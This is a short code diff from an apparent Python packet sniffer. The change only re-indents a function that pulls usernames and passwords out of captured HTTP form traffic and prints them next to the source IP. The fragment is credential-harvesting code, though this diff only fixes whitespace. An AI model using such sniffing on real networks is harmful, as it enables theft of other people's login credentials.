@@ -103,9 +103,9 @@ def http_sniff(packet):
 	s = str(packet[TCP].payload).split('\n')
 	result = re.match(r'^usr\S*', s[-1])
 	if result is not None:
-	up = str(result.group(0)).split('&')
-	print('src_ip', packet[IP].src, 'user: ', up[0].split('=')[1],
-            'password', up[1].split('=')[1])
+		up = str(result.group(0)).split('&')
+		print('src_ip', packet[IP].src, 'user: ', up[0].split('=')[1],
+	            'password', up[1].split('=')[1])
 
 
 
